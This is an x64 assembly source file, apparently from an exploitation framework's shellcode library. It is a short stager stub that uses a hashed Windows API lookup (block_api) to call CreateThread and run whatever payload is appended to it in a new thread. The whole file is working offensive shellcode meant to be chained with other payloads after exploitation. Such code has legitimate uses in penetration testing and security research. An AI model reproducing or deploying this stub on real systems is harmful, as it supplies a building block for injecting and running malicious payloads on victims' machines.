;
; Windows x64 CreateThread Stage Shellcode
;
; Author: Sean Dillon <sean.dillon@risksense.com> (@zerosum0x0)
; Copyright: (c) 2017 RiskSense, Inc.
; License: Apache 2.0
;
; Arguments: None
; Clobbers: RAX, RCX, RDX, R8, R9, R10, R11
; Notes: Append payload to run in a separate thread to end of this stub.
;

[BITS 64]
[ORG 0]

  cld
  jmp start

%include "./src/block/block_api.asm"

start:
  xor ecx, ecx

  push rcx
  push rcx

  push rcx                                    ; lpThreadId = NULL
  push rcx                                    ; dwCreationFlags = 0
  pop r9                                      ; lpParameter = NULL
  lea r8, [rel threadstart]                   ; lpStartAddr = &threadstart
  pop rdx                                     ; lpThreadAttributes = NULL

  mov r10d, 0x160D6838                        ; hash( "kernel32.dll", "CreateThread" )
  call rbp                                    ; CreateThread( NULL, 0, &threadstart, NULL, 0, NULL );
  add rsp, 40                                 ; RSP will be off by -40 after each call to block_api
  ret

threadstart:
  add rsp, 0x20                               ; remove shadow stack

